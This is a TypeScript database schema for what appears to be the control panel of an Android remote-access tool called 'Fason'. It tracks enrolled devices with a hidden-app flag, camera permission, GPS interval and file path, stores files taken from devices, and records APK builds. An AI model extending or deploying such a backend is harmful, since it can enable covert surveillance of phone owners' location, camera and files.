import { sqliteTable, text, integer, blob, uniqueIndex, index } from 'drizzle-orm/sqlite-core';

export const users = sqliteTable('users', {
  id: integer('id').primaryKey({ autoIncrement: true }),
  username: text('username').notNull().unique(),
  email: text('email').notNull().unique(),
  password: text('password').notNull(),
  role: text('role', { enum: ['admin', 'user'] }).notNull().default('user'),
  permissions: text('permissions').notNull().default('[]'),
  isDefault: integer('is_default').default(0),
  createdAt: text('created_at').notNull().$defaultFn(() => new Date().toISOString()),
  lastLogin: text('last_login'),
});

export const sessions = sqliteTable('sessions', {
  id: integer('id').primaryKey({ autoIncrement: true }),
  token: text('token').notNull().unique(),
  userId: integer('user_id').notNull().references(() => users.id, { onDelete: 'cascade' }),
  ip: text('ip').notNull(),
  createdAt: text('created_at').notNull().$defaultFn(() => new Date().toISOString()),
  expiresAt: text('expires_at').notNull(),
});

export const clients = sqliteTable('clients', {
  id: text('id').primaryKey(),
  ip: text('ip').default(''),
  country: text('country'),
  city: text('city'),
  timezone: text('timezone'),
  firstSeen: text('first_seen').$defaultFn(() => new Date().toISOString()),
  lastSeen: text('last_seen').$defaultFn(() => new Date().toISOString()),
  online: integer('online', { mode: 'boolean' }).default(false),
  reconnectCount: integer('reconnect_count').default(0),
  deviceModel: text('device_model'),
  deviceBrand: text('device_brand'),
  deviceVersion: text('device_version'),
  fasonHidden: integer('fason_hidden', { mode: 'boolean' }).default(false),
  cameraPermission: integer('camera_permission', { mode: 'boolean' }).default(false),
  currentPath: text('current_path').default(''),
  gpsInterval: integer('gps_interval').default(0),
  deviceInfo: text('device_info'),
});

export const deviceEnrollments = sqliteTable('device_enrollments', {
  id: text('id').primaryKey(),
  tokenHash: text('token_hash').notNull().unique(),
  status: text('status', { enum: ['pending', 'consumed', 'revoked', 'expired'] }).notNull().default('pending'),
  deviceId: text('device_id'),
  appName: text('app_name').notNull().default('Fason'),
  createdAt: text('created_at').notNull().$defaultFn(() => new Date().toISOString()),
  expiresAt: text('expires_at').notNull(),
  consumedAt: text('consumed_at'),
}, (table) => [
  index('idx_device_enrollments_status').on(table.status),
  index('idx_device_enrollments_device').on(table.deviceId),
]);

export const deviceCredentials = sqliteTable('device_credentials', {
  deviceId: text('device_id').primaryKey(),
  secretHash: text('secret_hash').notNull(),
  pendingSecretHash: text('pending_secret_hash'),
  status: text('status', { enum: ['active', 'revoked'] }).notNull().default('active'),
  enrollmentId: text('enrollment_id').references(() => deviceEnrollments.id, { onDelete: 'set null' }),
  createdAt: text('created_at').notNull().$defaultFn(() => new Date().toISOString()),
  rotatedAt: text('rotated_at'),
  lastUsedAt: text('last_used_at'),
  revokedAt: text('revoked_at'),
}, (table) => [
  index('idx_device_credentials_status').on(table.status),
]);

export const clientData = sqliteTable('client_data', {
  id: integer('id').primaryKey({ autoIncrement: true }),
  clientId: text('client_id').notNull().references(() => clients.id, { onDelete: 'cascade' }),
  dataType: text('data_type').notNull(),
  data: text('data').default('[]'),
  updatedAt: text('updated_at').$defaultFn(() => new Date().toISOString()),
}, (table) => [
  uniqueIndex('idx_client_data_unique').on(table.clientId, table.dataType),
]);

export const clientFiles = sqliteTable('client_files', {
  id: integer('id').primaryKey({ autoIncrement: true }),
  clientId: text('client_id').notNull().references(() => clients.id, { onDelete: 'cascade' }),
  fileType: text('file_type').notNull(),
  originalName: text('original_name').notNull(),
  mimeType: text('mime_type'),
  data: blob('data').notNull(),
  fileSize: integer('file_size').default(0),
  createdAt: text('created_at').$defaultFn(() => new Date().toISOString()),
});

export const logs = sqliteTable('logs', {
  id: integer('id').primaryKey({ autoIncrement: true }),
  type: text('type').notNull().default('INFO'),
  category: text('category').notNull().default('SYSTEM'),
  message: text('message').notNull(),
  details: text('details'),
  createdAt: text('created_at').$defaultFn(() => new Date().toISOString()),
});

export const buildRecords = sqliteTable('build_records', {
  id: integer('id').primaryKey({ autoIncrement: true }),
  serverUrl: text('server_url').notNull(),
  homePageUrl: text('home_page_url').notNull(),
  appName: text('app_name').notNull().default('Fason'),
  status: text('status', { enum: ['completed', 'failed'] }).default('completed'),
  apkData: blob('apk_data'),
  fileSize: integer('file_size').default(0),
  createdAt: text('created_at').$defaultFn(() => new Date().toISOString()),
  completedAt: text('completed_at'),
});

export const settings = sqliteTable('settings', {
  key: text('key').primaryKey(),
  value: text('value').notNull(),
  updatedAt: text('updated_at').$defaultFn(() => new Date().toISOString()),
});

export const loginAttempts = sqliteTable('login_attempts', {
  id: integer('id').primaryKey({ autoIncrement: true }),
  ip: text('ip').notNull(),
  attemptedAt: text('attempted_at').notNull().$defaultFn(() => new Date().toISOString()),
}, (table) => [
  index('idx_login_attempts_attempted_at').on(table.attemptedAt),
]);

export const jwtSecret = sqliteTable('jwt_secret', {
  id: integer('id').primaryKey(),
  secret: text('secret').notNull(),
});
